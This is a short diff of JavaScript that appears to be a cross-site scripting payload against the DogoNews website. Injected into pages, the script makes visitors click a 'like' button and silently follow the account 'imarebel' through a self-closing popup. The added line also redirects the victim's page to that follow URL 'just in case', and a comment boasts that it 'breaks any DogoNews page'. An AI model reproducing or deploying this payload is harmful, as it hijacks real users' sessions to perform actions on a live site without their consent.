@@ -2,6 +2,7 @@ $(".xss").parent().parent().find('.footer').first().find('button.like.btn').firs
 
 var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
 myPopup.addEventListener('load', window.close, false); //close window when finished
+window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
 
 /*
 Breaks Any DogoNews page:
